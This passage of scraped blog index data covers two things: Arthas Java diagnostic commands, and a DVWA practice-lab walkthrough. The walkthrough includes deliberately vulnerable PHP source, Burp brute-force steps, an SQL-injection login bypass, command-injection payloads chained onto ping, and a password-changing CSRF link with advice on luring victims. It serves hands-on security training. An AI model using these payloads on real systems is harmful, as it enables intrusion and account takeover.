说明 sc 查看JVM已加载的类信息 sm 查看已加载类的方法信息 jad 反编译字节码为源代码 mc 内存编译器,内存编译.java文件为.class文件 redefine 加载外部的.class文件,redefine到JVM里 retransform 加载外部的.class文件,retransform到JVM里(推荐) dump dump已加载类的byte code到特定目录 classloader 获取类加载器信息 ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"sc 查看JVM已加载的类信息,“Search-Class\"的简写,这个命令能搜索出所有已经加载到JVM中的Class信息. sc默认开启了子类匹配功能,也就是说所有当前类的子类也会被搜索出来,想要精确的匹配,可以执行下述命令. options disable-sub-class true 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配,支持全限定名,如com.luohun.test.AAA,也支持com/luohun/test/AAA这样的格式 method-pattern 方法名表达式匹配 [d] 输出当前类的详细信息,包括这个类所加载的原始文件来源、类的声明、加载的ClassLoader等详细信息. 如果一个类被多个ClassLoader所加载,则会出现多次 [E] 开启正则表达式匹配，默认为通配符匹配 [f] 输出当前类的成员变量信息(需要配合参数-d一起使用) 示例命令如下: //模糊搜索，demo包下所有的类 sc demo.* //打印类的详细信息 sc -d demo.MathGame ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:1","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"sm 查看已加载类的方法信息,“Search-Method\"的简写,这个命令能搜索出所有已经加载了Class信息的方法信息.但是只能看到由当前类所声明(declaring)的方法,父类则无法看到. 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配 method-pattern 方法名表达式匹配 [d] 展示每个方法的详细信息 [E] 开启正则表达式匹配，默认为通配符匹配 示例命令如下: //显示String类加载的方法 sm java.lang.String //显示String中的toString方法详细信息 sm -d java.lang.String toString ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:2","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"jad 反编译字节码为源代码. 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配 [E] 开启正则表达式匹配，默认为通配符匹配 示例命令如下: //编译java.lang.String jad java.lang.String //反编绎时只显示源代码,默认情况下,反编译结果里会带有ClassLoader信息,通过--source-only选项,可以只打印源代码.方便和mc/redefine命令结合使用. jad --source-only demo.MathGame \u003e C:/Users/XiaLuoHun/Desktop/jad/MathGame.java //反编译指定的函数 jad demo.MathGame main ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:3","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"mc Memory Compiler/内存编译器,编译.java文件生成.class 示例命令如下: //在内存中编译Hello.java为Hello.class mc C:/Users/XiaLuoHun/Desktop/jad/MathGame.java //可以通过-d命令指定输出目录 mc -d C:/Users/XiaLuoHun/Desktop/jad C:/Users/XiaLuoHun/Desktop/jad/MathGame.java ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:4","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"redefine 加载外部的.class文件,推荐使用retransform 示例命令如下: //使用redefine命令加载新的字节码 redefine C:/Users/XiaLuoHun/Desktop/jad/demo/MathGame.class redefine的限制如下: 不允许新增加field/method 正在跑的函数,没有退出不能生效,比如下面新增加的System.out.println,只有run()函数里的会生效 public class MathGame { public static void main(String[] args) throws InterruptedException { MathGame game = new MathGame(); while (true) { game.run(); TimeUnit.SECONDS.sleep(1); // 这个不生效，因为代码一直跑在 while里 System.out.println(\"in loop\"); } } public void run() throws InterruptedException { // 这个生效，因为run()函数每次都可以完整结束 System.out.println(\"call run()\"); try { int number = random.nextInt(); List\u003cInteger\u003e primeFactors = primeFactors(number); print(number, primeFactors); } catch (Exception e) { System.out.println(String.format(\"illegalArgumentCount:%3d, \", illegalArgumentCount) + e.getMessage()); } } } 注意 redefine后的原来的类不能恢复,redefine有可能失败(比如增加了新的field) reset命令对redefine的类无效.如果想重置,需要redefine原始的字节码 redefine命令和jad/watch/trace/monitor/tt等命令会冲突.执行完redefine之后,如果再执行上面提到的命令,则会把redefine的字节码重置 ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:5","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"retransform 加载外部的.class文件 示例命令如下: //加载指定的.class文件,然后解析出class name,再retransform jvm中已加载的对应的类 //每加载一个.class 文件,则会记录一个retransform entry retransform C:/Users/XiaLuoHun/Desktop/jad/demo/MathGame.class //查看retransform entry retransform -l //删除指定retransform entry retransform -d 1 //删除所有retransform entry retransform --deleteAll //显式触发 retransform retransform --classPattern demo.MathGame 若要消除retransform的影响需进行下述步骤: 删除这个类对应的retransform entry 重新触发retransform retransform的限制如下: 不允许新增加field/method 正在跑的函数,没有退出不能生效,比如下面新增加的System.out.println,只有run()函数里的会生效 public class MathGame { public static void main(String[] args) throws InterruptedException { MathGame game = new MathGame(); while (true) { game.run(); TimeUnit.SECONDS.sleep(1); // 这个不生效，因为代码一直跑在 while里 System.out.println(\"in loop\"); } } public void run() throws InterruptedException { // 这个生效，因为run()函数每次都可以完整结束 System.out.println(\"call run()\"); try { int number = random.nextInt(); List\u003cInteger\u003e primeFactors = primeFactors(number); print(number, primeFactors); } catch (Exception e) { System.out.println(String.format(\"illegalArgumentCount:%3d, \", illegalArgumentCount) + e.getMessage()); } } } ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:6","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"dump 将已加载类的字节码文件保存到特定目录:%HOMEPATH%/logs/arthas/classdump 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配 [c:] 类所属ClassLoader的hashcode [E] 开启正则表达式匹配,默认为通配符匹配 示例命令如下: //把demo包下所有的类的字节码文件保存到~/logs/arthas/classdump/目录下 dump demo.* ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:7","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"classloader 获取类加载器的信息 参数说明如下: 参数名称 参数说明 [l] 按类加载实例进行统计 [t] 打印所有ClassLoader的继承树 [a] 列出所有ClassLoader加载的类,请谨慎使用 [c:] ClassLoader的hashcode [c: r:] 用ClassLoader去查找resource [c: load:] 用ClassLoader去加载指定的类 示例命令如下: //默认按类加载器的类型查看统计信息 classloader //按类加载器的实例查看统计信息，可以看到类加载的hashCode classloader -l //查看ClassLoader的继承树 classloader -t //通过类加载器的hash，查看此类加载器实际所在的位置 classloader -c 798f84d5 //使用ClassLoader去查找类的class文件所在的位置 classloader -c 798f84d5 -r java/lang/String.class //使用ClassLoader去加载类 classloader -c 798f84d5 --load java.lang.String ","date":"2024-06-11","objectID":"/posts/java/arthas/:5:8","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"进阶命令 命令 说明 monitor 监控指定类中方法的执行情况 watch 观察到指定方法的调用情况 trace 对方法内部调用路径进行追踪,并输出方法路径上每个节点上耗时 stack 输出当前方法被调用的路径 tt 记录指定方法每次调用的入参和返回信息 options 全局开关 ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"monitor 监控指定类中方法的执行情况 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配 method-pattern 方法名表达式匹配 [E] 开启正则表达式匹配,默认为通配符匹配 [c:] 统计周期,默认值为120秒 示例命令如下: //过5秒监控一次，类demo.MathGame中primeFactors方法 monitor -c 5 demo.MathGame primeFactors 监控项说明如下: 监控项 说明 timestamp 时间戳 class Java类 method 方法(构造方法、普通方法) total 调用次数 success 成功次数 fail 失败次数 rt 平均耗时 fail-rate 失败率 ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:1","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"watch 观察指定方法的调用情况 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配 method-pattern 方法名表达式匹配 express 观察表达式 condition-express 条件表达式 [b] 在方法调用之前观察before [e] 在方法异常之后观察exception [s] 在方法返回之后观察success [f] 在方法结束之后(正常返回和异常返回)观察finish [E] 开启正则表达式匹配,默认为通配符匹配 [x:] 指定输出结果的属性遍历深度,默认为1 注意 watch 命令定义了4个观察事件点,即-b方法调用前,-e方法异常后,-s 方法返回后,-f方法结束后 4个观察事件点-b、-e、-s默认关闭,-f 默认打开,当指定观察点被打开后,在相应事件点会对观察表达式进行求值并输出 这里要注意方法入参和方法出参的区别,有可能在中间被修改导致前后不一致,除了-b事件点params代表方法入参外,其余事件都代表方法出参 当使用-b时,由于观察事件点是在方法调用前,此时返回值或异常均不存在 示例命令如下: //观察demo.MathGame类中primeFactors方法出参和返回值,结果属性遍历深度为2 //params表示所有参数数组(因为不确定是几个参数)，returnObject表示返回值 watch demo.MathGame primeFactors \"{params,returnObj}\" -x 2 //观察方法入参,对比前一个例子,返回值为空(事件点为方法执行前,因此获取不到返回值) watch demo.MathGame primeFactors \"{params,returnObj}\" -x 2 -b //同时观察方法调用前和方法返回后,参数里-n 2,表示只执行两次 //这里输出结果中,第一次输出的是方法调用前的观察表达式的结果,第二次输出的是方法返回后的表达式的结果 //params表示参数,target表示执行方法的对象,returnObject表示返回值 watch demo.MathGame primeFactors \"{params,target,returnObj}\" -x 2 -b -s -n 2 //条件表达式的例子，输出第1参数小于的情况 watch demo.MathGame primeFactors \"{params[0],target}\" \"params[0]\u003c0\" ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:2","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"trace 对方法内部调用路径进行追踪,并输出方法路径上的每个节点上耗时 参数说明如下: 参数名称 参数说明 class-pattern 类名表达匹配 method-pattern 方法名表达式匹配 condition-express 条件表达式,使用OGNL表达式 [E] 开启正则表达式匹配,默认是通配符匹配 [n:] 设置命令执行次数 #cost 方法执行耗时,单位是毫秒 示例命令如下: //trace函数指定类的指定方法 trace demo.MathGame run //如果方法调用的次数很多,那么可以用-n参数指定捕捉结果的次数.比如下面的例子里,捕捉到一次调用就退出命令 trace demo.MathGame run -n 1 //默认情况下,trace不会包含jdk里的函数调用,如果希望trace jdk里的函数,需要显式设置--skipJDKMethod false trace --skipJDKMethod false demo.MathGame run ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:3","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"stack 输出当前方法被调用的调用路径 参数说明如下: 参数名称 参数说明 class-pattern 类名表达式匹配 method-pattern 方法名表达式匹配 condition-express 条件表达式,OGNL [E] 开启正则表达式匹配,默认为通配符匹配 [n:] 执行次数限制 示例命令如下: //获取primeFactors的调用路径 stack demo.MathGame primeFactors //条件表达式来过滤，第0个参数的值小于0，-n表示获取2次 stack demo.MathGame primeFactors 'params[0]\u003c0' -n 2 ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:4","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"tt 记录下指定方法每次调用的入参和返回信息,并能对这些不同时间下调用的信息进行观测 参数说明如下: 参数名称 说明 -t 记录某个方法在一个时间段中的调用 -l 显示所有已经记录的列表 -n 次数 只记录多少次 -s 表达式 搜索表达式 -i 索引号 查看指定索引号的详细调用信息 -p 重新调用指定的索引号时间碎片 示例命令如下: //记录下当前方法的每次调用环境现场。 tt -t demo.MathGame primeFactors //检索调用记录 tt -l //筛选出primeFactors方法的调用信息 tt -s 'method.name==\"primeFactors\"' //查看调用信息 //-i 参数后边跟着对应的INDEX编号查看到详细信息 tt -i 1002 //重做一次调用 //tt命令由于保存了当时调用的所有现场信息,所以我们可以自己主动对一个INDEX编号的时间片自主发起一次调用,从而解放你的沟通成本 //可以通过--replay-times指定调用次数,通过 `--replay-interval` 指定多次调用间隔(单位ms, 默认1000ms) tt -i 1002 -p 表格字段说明如下: 表格字段 字段解释 INDEX 时间片段记录编号,每一个编号代表着一次调用,后续tt还有很多命令都是基于此编号指定记录操作,非常重要 TIMESTAMP 方法执行的本机时间,记录了这个时间片段所发生的本机时间 COST(ms) 方法执行的耗时 IS-RET 方法是否以正常返回的形式结束 IS-EXP 方法是否以抛异常的形式结束 OBJECT 执行对象的hashCode(),注意,曾经有人误认为是对象在JVM中的内存地址,但很遗憾他不是.但他能帮助你简单的标记当前执行方法的类实体 CLASS 执行的类名 METHOD 执行的方法名 ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:5","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"options 全局开关 全局选项如下: 名称 默认值 描述 unsafe false 是否支持对系统级别的类进行增强,打开该开关可能导致把JVM搞挂,请慎重选择! dump false 是否支持被增强了的类dump到外部文件中,如果打开开关,class文件会被dump到/${application dir}/arthas-class-dump/目录下,具体位置详见控制台输出 batch-re-transform true 是否支持批量对匹配到的类执行retransform操作 json-format false 是否支持json化的输出 disable-sub-class false 是否禁用子类匹配,默认在匹配目标类的时候会默认匹配到其子类,如果想精确匹配,可以关闭此开关 debug-for-asm false 打印ASM相关的调试信息 save-result false 是否打开执行结果存日志功能,打开之后所有命令的运行结果都将保存到~/logs/arthas-cache/result.log中 job-timeout 1d 异步后台任务的默认超时时间,超过这个时间,任务自动停止;比如设置 1d, 2h, 3m, 25s,分别代表天、小时、分、秒 print-parent-fields true 是否打印在parent class里的filed 示例命令如下: //查看所有的options options //获取option的值 options json-format //设置指定的option options save-result true ","date":"2024-06-11","objectID":"/posts/java/arthas/:6:6","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"参考链接 Arthas帮助文档 ","date":"2024-06-11","objectID":"/posts/java/arthas/:7:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Web安全"],"content":"环境搭建 https://github.com/digininja/DVWA https://www.xp.cn/download.html 运行phpStudy 将下载好的DVWA文件放在www文件目录下面 将DVWA/config文件夹下的config.inc.php.dist拷贝一份,修改文件名为config.inc.php 打开config.inc.php,修改如下： #phpstudy中自带数据库，默认账号密码都是root $_DVWA[ 'db_server' ] = '127.0.0.1'; $_DVWA[ 'db_database' ] = 'dvwa'; $_DVWA[ 'db_user' ] = 'root'; $_DVWA[ 'db_password' ] = 'root'; $_DVWA[ 'db_port'] = '3306'; 在浏览器打开下述链接进行安装 http://127.0.0.1/dvwa/setup.php 在浏览器中打开下述链接进行登录 http://127.0.0.1/dvwa/login.php 默认凭据为:admin password ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:1:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"暴力破解 ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:2:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php if( isset( $_GET[ 'Login' ] ) ) { // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); if( $result \u0026\u0026 mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"\u003cp\u003eWelcome to the password protected area {$user}\u003c/p\u003e\"; echo \"\u003cimg src=\\\"{$avatar}\\\" /\u003e\"; } else { // Login failed echo \"\u003cpre\u003e\u003cbr /\u003eUsername and/or password incorrect.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e 上述未做任何的防爆破措施,且输入的用户名直接拼接SQL语句,存在SQL注入. 可以使用下述万能账号,不需要密码即可登录成功. admin' or '1' = '1# 这里展示下使用BurpSuite的Intruder模块进行暴力破解. BurpSuite抓包 右键发送到Intruder 对数据包中的password进行标记 在Payloads界面进行字典设置,然后点击\"Start attack\"按钮 查看结果 ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:2:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php if( isset( $_GET[ 'Login' ] ) ) { // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); if( $result \u0026\u0026 mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"\u003cp\u003eWelcome to the password protected area {$user}\u003c/p\u003e\"; echo \"\u003cimg src=\\\"{$avatar}\\\" /\u003e\"; } else { // Login failed sleep( 2 ); echo \"\u003cpre\u003e\u003cbr /\u003eUsername and/or password incorrect.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e 上述只是用mysqli_real_escape_string函数对一些特殊字符进行了转义,避免了SQL注入的情况.暴力破解方法同Low. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:2:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php if( isset( $_GET[ 'Login' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); if( $result \u0026\u0026 mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"\u003cp\u003eWelcome to the password protected area {$user}\u003c/p\u003e\"; echo \"\u003cimg src=\\\"{$avatar}\\\" /\u003e\"; } else { // Login failed sleep( rand( 0, 3 ) ); echo \"\u003cpre\u003e\u003cbr /\u003eUsername and/or password incorrect.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?\u003e 上述代码调用checkToken函数,加入了Anti-CSRFToken的参数,每次都会产生随机的user_token,增加了爆破的难度. 另外调用了stripslashes、mysqli_real_escape_string对用户输入的参数进行转义,进一步防止了SQL注入. BurpSuite抓包 右键发送到Intruder,此时不要将该包释放掉. 选择攻击类型为\"Pitchfork\",对password和user_token进行标记 对Payload 1进行添加 设置线程为1 获取Token值并复制(320292564f9c02a562c11e6556ea7cec) 设置重定向为Always 对Payload 2进行添加,然后点击\"Start attack\"按钮 查看结果 ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:2:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"命令注入 Command injection,即命令注入.指通过提交恶意构造的参数破坏命令语句结构,从而达到执行恶意命令的目的. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:3:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"\u003cpre\u003e{$cmd}\u003c/pre\u003e\"; } ?\u003e 向输入框中输入127.0.0.1后,发现乱码. 打开下述文件,搜索utf-8 全部替换成 gb2312. D:/phpStudy 8.1.0.1/WWW/DVWA/dvwa/includes/dvwaPage.inc.php 再次输入127.0.0.1,就会发现正常了. 拼接命令如下: 127.0.0.1 \u0026\u0026 ipconfig ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:3:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '\u0026\u0026' =\u003e '', ';' =\u003e '', ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"\u003cpre\u003e{$cmd}\u003c/pre\u003e\"; } ?\u003e 上述对用户输入内容设置了黑名单,对\u0026\u0026以及;进行了转义.使用下述拼接命令即可. 127.0.0.1 \u0026 dir ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:3:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '\u0026' =\u003e '', ';' =\u003e '', '| ' =\u003e '', '-' =\u003e '', '$' =\u003e '', '(' =\u003e '', ')' =\u003e '', '`' =\u003e '', '||' =\u003e '', ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"\u003cpre\u003e{$cmd}\u003c/pre\u003e\"; } ?\u003e 上述代码对黑名单的设置更加精细.但仔细观察上面的黑名单只是对’| ‘进行了转义,也就是说单独的’|‘可用.故拼接命令如下: 127.0.0.1 |dir ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:3:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"CSRF CSRF,全称Cross-site request forgery,即跨站请求伪造.指利用受害者尚未失效的身份认证信息(cookie、会话等),引导诱骗用户点击存在恶意代码的页面,在受害人不知情的情况下利用受害者的身份向服务器发送请求,从而完成非法操作. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:4:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php if( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $current_user = dvwaCurrentUser(); $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . $current_user . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); // Feedback for the user echo \"\u003cpre\u003ePassword Changed.\u003c/pre\u003e\"; } else { // Issue with passwords matching echo \"\u003cpre\u003ePasswords did not match.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e 上述未做任何防护,可以诱导用户点击下述链接即可成功修改密码 http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123\u0026password_conf=123\u0026Change=Change# 上述比较明显,可以将上述长链接转换为短链接. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:4:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php if( isset( $_GET[ 'Change' ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? 